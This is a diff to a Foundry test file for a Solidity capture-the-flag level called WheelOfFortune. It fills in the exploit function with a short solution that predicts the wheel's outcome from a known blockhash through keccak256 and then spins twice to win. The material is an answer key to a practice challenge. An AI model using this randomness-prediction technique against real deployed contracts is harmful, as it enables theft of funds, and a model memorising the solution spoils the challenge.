@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/03_WheelOfFortune/WheelOfFortune.sol";
+import "../src/03_WheelOfFortune/WheelOfFortune.sol";
 
 // forge test --match-contract WheelOfFortuneTest -vvvv
 contract WheelOfFortuneTest is BaseTest {
@@ -15,7 +15,12 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        bytes32 hashVal = bytes32(blockhash(48743985));
+
+        uint256 result = uint256(keccak256(abi.encode(hashVal))) % 100;
+
+        instance.spin{value: 0.01 ether}(result);
+        instance.spin{value: 0.01 ether}(0);
 
         checkSuccess();
     }
